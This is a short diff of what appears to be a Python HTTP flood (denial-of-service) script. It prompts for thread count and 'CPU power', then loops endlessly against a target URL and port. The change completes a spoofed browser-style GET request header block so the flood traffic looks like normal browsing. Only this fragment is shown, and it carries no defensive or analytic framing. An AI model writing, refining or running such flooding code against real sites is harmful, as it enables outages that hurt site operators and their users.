@@ -19,7 +19,7 @@ thr = int(input("Set Your Threads ~/"))
 pow = int(input("Set Your CPU Power ~/"))
 
 def http():
-        request = "GET / HTTP/1.1\r\nHost: " + url + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safa$
+        request = "GET / HTTP/1.1\r\nHost: " + url + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n"
         tar = (url,port)
         while True:
                 try:
